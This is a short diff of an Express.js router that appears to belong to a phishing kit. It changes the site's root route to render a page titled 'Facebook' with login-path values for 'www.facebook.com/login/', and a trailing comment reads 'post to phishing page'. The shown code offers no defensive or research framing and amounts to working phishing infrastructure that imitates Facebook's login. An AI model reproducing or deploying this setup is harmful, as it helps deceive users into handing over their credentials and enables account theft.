@@ -1,12 +1,12 @@
 var express = require('express');
 var router = express.Router();
 
+// /* GET home page. */
+// router.get('/', function(req, res, next) {
+//   res.render('index', { title: "Express", 'domain-name': 'Express', 'domain-path': 'ok' });
+// });
 /* GET home page. */
 router.get('/', function(req, res, next) {
-  res.render('index', { title: "Express", 'domain-name': 'Express', 'domain-path': 'ok' });
-});
-/* GET home page. */
-router.get('/facebook', function(req, res, next) {
   res.render('index', { title: "Facebook", 'domain-name': 'www.facebook.com/', 'domain-path': 'login/' });
 });
 // post to phishing page 
